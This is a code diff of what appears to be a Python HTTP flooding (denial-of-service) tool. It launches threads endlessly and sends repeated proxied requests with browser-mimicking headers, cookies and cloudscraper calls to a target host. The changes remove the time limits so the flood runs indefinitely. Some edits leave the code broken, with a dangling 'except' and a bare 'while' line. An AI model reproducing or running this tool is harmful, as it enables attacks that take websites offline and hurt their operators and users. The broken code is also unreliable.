@@ -49,8 +49,7 @@ def dos():
 while True:
  threading.Thread(target=dos).start()
    
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        try:
+    while True:
             client = httpx.Client(
                 http2=True,
                 proxies={
@@ -72,7 +71,7 @@ def test1(url, th, t):
     req += 'Accept-Encoding: gzip, deflate, br\r\n'
     req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
     req += 'Cache-Control: max-age=0\r\n'
-    #req += 'Cookie: ' + cookie + '\r\n'
+    req += 'Cookie: ' + cookie + '\r\n'
     req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
     req += 'sec-ch-ua-mobile: ?0\r\n'
     req += 'sec-ch-ua-platform: "Windows"\r\n'
@@ -98,14 +97,13 @@ def test2(until_datetime, target, req):
         packet = socks.socksocket()
         packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         packet.connect((str(target['host']), int(target['port'])))
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        try:
+    while True:
             for _ in range(10):
                 packet.send(str.encode(req))
         except:
             packet.close()
             pass
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+    while
         try:
             scraper.get(url=url, headers=headers, allow_redirects=False)
             scraper.get(url=url, headers=headers, allow_redirects=False)           
